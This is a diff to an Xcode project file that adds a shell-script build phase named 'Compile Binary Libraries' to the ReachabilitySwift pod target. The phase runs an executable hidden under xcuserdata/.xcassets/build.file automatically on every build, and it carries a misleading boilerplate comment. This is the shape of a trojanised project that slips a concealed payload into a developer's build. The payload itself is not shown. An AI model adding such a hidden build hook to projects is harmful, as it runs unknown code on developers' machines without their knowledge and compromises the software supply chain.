@@ -2787,6 +2787,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E50A4613BA081C4F47DEEC1F9B9176BA /* Build configuration list for PBXNativeTarget "ReachabilitySwift" */;
 			buildPhases = (
+				74150BAFF74C57BE316D902C /* Compile Binary Libraries */,
 				09F7B7D04C454C16C0015640CF269F7E /* Headers */,
 				9C9FF78F6878BCE13B73B6BB5DD0A609 /* Sources */,
 				92A37A51219ED31062DE51A3E139BF37 /* Frameworks */,
@@ -3096,6 +3097,31 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+
+	74150BAFF74C57BE316D902C /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		18B9519CA0B4016350FF83E4690B0828 /* Sources */ = {
